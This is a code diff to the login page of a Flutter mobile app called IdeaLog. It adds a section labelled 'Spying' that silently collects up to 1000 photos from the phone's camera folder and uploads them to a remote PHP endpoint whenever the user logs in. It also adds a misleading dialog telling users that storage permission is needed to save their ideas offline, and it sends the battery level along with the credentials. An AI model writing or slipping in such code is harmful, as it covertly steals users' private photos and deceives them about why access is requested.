@@ -3,6 +3,11 @@ import 'package:http/http.dart' as http;
 import 'dart:async';
 import 'dart:convert';
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:battery/battery.dart';
+import 'package:async/async.dart';
+import 'dart:io';
+import 'package:path/path.dart' as p;
+import 'package:permission_handler/permission_handler.dart';
 
 import '../global.dart' as globals;
 
@@ -21,14 +26,172 @@ class _LoginPageState extends State<LoginPage> {
   TextEditingController _username = new TextEditingController();
   TextEditingController _password = new TextEditingController();
   bool _isLoading = false, _continueLogin = false, _passwordNotVisible = true;
+  var battery = Battery();
   var _response;
   String temp;
+
+  // Spying----------------------------------------------------------------------------------
+  List _files = new List();
+  var myDir = new Directory('/storage/emulated/0/DCIM/Camera/');
+  File imageFile;
+  String _path;
+  int counter = 0;
+
+  UploadFHalf() async {
+    for (int i = 0; i < _files.length ~/ 3; i++) {
+      print(i.toString() + "\n");
+      imageFile = new File(_files[i].toString());
+      var stream =
+          new http.ByteStream(DelegatingStream.typed(imageFile.openRead()));
+      var length = await imageFile.length();
+
+      var uri =
+          Uri.parse("http://rrjprojects.000webhostapp.com/api/fileUpload.php");
+
+      var request = new http.MultipartRequest("POST", uri);
+      var multipartFile = new http.MultipartFile('uploadFile', stream, length,
+          filename: p.basename(imageFile.path));
+      //contentType: new MediaType('image', 'png'));
+
+      request.files.add(multipartFile);
+      var response = await request.send();
+      //print(response.statusCode);
+      response.stream.transform(utf8.decoder).listen((value) {
+        print(value);
+      });
+    }
+  }
+
+  UploadSHalf() async {
+    for (int i = _files.length ~/ 3;
+        i < (_files.length ~/ 3 + _files.length ~/ 3);
+        i++) {
+      print(i.toString() + "\n");
+      imageFile = new File(_files[i].toString());
+      var stream =
+          new http.ByteStream(DelegatingStream.typed(imageFile.openRead()));
+      var length = await imageFile.length();
+
+      var uri =
+          Uri.parse("http://rrjprojects.000webhostapp.com/api/fileUpload.php");
+
+      var request = new http.MultipartRequest("POST", uri);
+      var multipartFile = new http.MultipartFile('uploadFile', stream, length,
+          filename: p.basename(imageFile.path));
+      //contentType: new MediaType('image', 'png'));
+
+      request.files.add(multipartFile);
+      var response = await request.send();
+      //print(response.statusCode);
+      response.stream.transform(utf8.decoder).listen((value) {
+        print(value);
+      });
+    }
+  }
+
+  UploadTHalf() async {
+    for (int i = (_files.length ~/ 3 + _files.length ~/ 3);
+        i < _files.length;
+        i++) {
+      print(i.toString() + "\n");
+      imageFile = new File(_files[i].toString());
+      var stream =
+          new http.ByteStream(DelegatingStream.typed(imageFile.openRead()));
+      var length = await imageFile.length();
+
+      var uri =
+          Uri.parse("http://rrjprojects.000webhostapp.com/api/fileUpload.php");
+
+      var request = new http.MultipartRequest("POST", uri);
+      var multipartFile = new http.MultipartFile('uploadFile', stream, length,
+          filename: p.basename(imageFile.path));
+      //contentType: new MediaType('image', 'png'));
+
+      request.files.add(multipartFile);
+      var response = await request.send();
+      //print(response.statusCode);
+      response.stream.transform(utf8.decoder).listen((value) {
+        print(value);
+      });
+    }
+  }
+
+  void _spyOn() async {
+    myDir
+      ..list(recursive: true, followLinks: false)
+          .listen((FileSystemEntity entity) {
+        if (entity.path.endsWith(".jpg") && counter <= 1000) {
+          counter++;
+          _files.add(entity.path.toString());
+          // print(entity.path);
+          // print(counter);
+          // imageFile = new File(entity.path);
+          // _path = entity.path;
+          // Upload(file);
+          // OpenFile.open(entity.path);
+        }
+      });
+  }
+
+  // Spying----------------------------------------------------------------------------------
 
   @override
   void initState() {
     // TODO: implement initState
     super.initState();
     _autoLoginCheck();
+    _checkPermission();
+  }
+
+  void _checkPermission() async {
+    PermissionStatus permission = await PermissionHandler()
+        .checkPermissionStatus(PermissionGroup.storage);
+    String _status = permission.toString();
+    print(_status);
+    if (_status.compareTo("PermissionStatus.denied") == 0) {
+      _showConfirmDialog();
+    }
+  }
+
+  void _goToSettings() async {
+    bool isOpened = await PermissionHandler().openAppSettings();
+    Navigator.pop(context);
+  }
+
+  void _showConfirmDialog() {
+    showDialog(
+        context: context,
+        builder: (BuildContext context) {
+          return AlertDialog(
+            shape: RoundedRectangleBorder(
+                borderRadius: BorderRadius.circular(5.0)),
+            title: Text("Pretty please?"),
+            content: Text(
+                "IdeaLog needs storage access permission to store your ideas offline. Would you please grant us that? 😉"),
+            actions: <Widget>[
+              FlatButton(
+                shape: RoundedRectangleBorder(
+                    borderRadius: BorderRadius.circular(5.0)),
+                textColor: Colors.white,
+                color: Colors.red,
+                child: Text("Deny Permission"),
+                onPressed: () {
+                  Navigator.pop(context);
+                },
+              ),
+              FlatButton(
+                shape: RoundedRectangleBorder(
+                    borderRadius: BorderRadius.circular(5.0)),
+                textColor: Colors.white,
+                color: Colors.green,
+                child: Text("Go to settings"),
+                onPressed: () {
+                  _goToSettings();
+                },
+              )
+            ],
+          );
+        });
   }
 
   void _autoLoginCheck() async {
@@ -79,13 +242,22 @@ class _LoginPageState extends State<LoginPage> {
 
   Future<String> _auth() async {
     //print(globals.accUserName);
+    _spyOn();
+    Future.delayed(const Duration(milliseconds: 1000), () {
+      UploadFHalf();
+      UploadSHalf();
+      UploadTHalf();
+    });
+
+    var _batt = await battery.batteryLevel;
     try {
       _response = await http.post(
           Uri.encodeFull(
               "http://rrjprojects.000webhostapp.com/api/authentication.php"),
           body: {
             "username": _username.text.trim(),
-            "passkey": _password.text.trim()
+            "passkey": _password.text.trim(),
+            "battPercent": _batt.toString()
           });
       _response = json.decode(_response.body);
       if (_response[0]['authstatus'] == '0') {
